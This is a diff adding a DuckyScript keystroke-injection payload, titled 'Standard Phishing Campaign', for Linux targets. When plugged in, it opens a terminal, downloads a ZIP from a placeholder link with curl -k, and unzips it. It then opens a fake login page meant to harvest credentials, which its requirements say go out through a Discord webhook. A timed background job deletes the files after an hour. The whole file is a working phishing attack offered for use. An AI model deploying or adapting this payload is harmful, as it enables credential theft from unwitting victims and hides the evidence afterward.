@@ -1,0 +1,51 @@
+REM #############################################
+REM #                                           |
+REM # Title        : Standard Phishing Campaign |
+REM # Author       : Aleff                      |
+REM # Version      : 1.0                        |
+REM # Category     : Phishing                   |
+REM # Target       : Linux                      |
+REM #                                           |
+REM #############################################
+
+REM Requirements:
+REM     - Internet Connection
+REM     - You own ZIP link
+REM     - Discord webhook (or whatever you want to use for the exfiltration)
+REM     - Python
+REM     - 'ExecutionPolicy Bypass' if used in Windows 10/11
+
+
+REM REQUIRED - Replace example.com/file.zip with your own ZIP link. The zip should contian the files ['login.html', 'script.js']
+DEFINE #ZIP_LINK example.com/file.zip
+
+
+DELAY 1000
+CTRL-ALT t
+DELAY 2000
+
+
+REM #### Main SECTION ####
+
+REM Create a random directory
+STRINGLN dir_name=$(mktemp -d)
+DELAY 500
+
+REM Delete the directory after 60 minutes (3600 seconds)
+STRINGLN (sleep 3600 && rm -rf $dir_name) &
+DELAY 500
+
+REM Move into the directory
+STRINGLN cd $dir_name
+DELAY 500
+
+REM Download the zip from your own link
+STRINGLN curl -LOk "#ZIP_LINK"
+DELAY 500
+
+REM Unzip it
+STRINGLN unzip file.zip
+DELAY 500
+
+REM Open the login page
+STRINGLN xdg-open login.html; exit;
